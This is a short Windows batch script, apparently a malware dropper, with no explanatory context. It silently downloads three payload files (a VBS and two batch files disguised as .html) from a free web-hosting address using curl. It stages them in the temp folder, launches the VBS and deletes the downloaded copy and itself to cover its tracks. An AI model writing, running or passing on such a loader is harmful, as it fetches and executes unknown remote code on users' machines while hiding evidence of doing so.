@echo off

curl.exe https://h19qjj92.000webhostapp.com/code2.html --silent -o check.vbs

curl.exe https://h19qjj92.000webhostapp.com/code6.html --silent -o checker.bat

curl.exe https://h19qjj92.000webhostapp.com/code4.html --silent -o dan.bat

timeout 1

copy "check.vbs" "%TEMP%"

timeout 1

copy "checker.bat" "%TEMP%"

timeout 1

copy "dan.bat" "%TEMP%"

timeout 1

del "%~dp0check.vbs"

timeout 1

start %TEMP%\check.vbs

timeout 2

del "code.bat"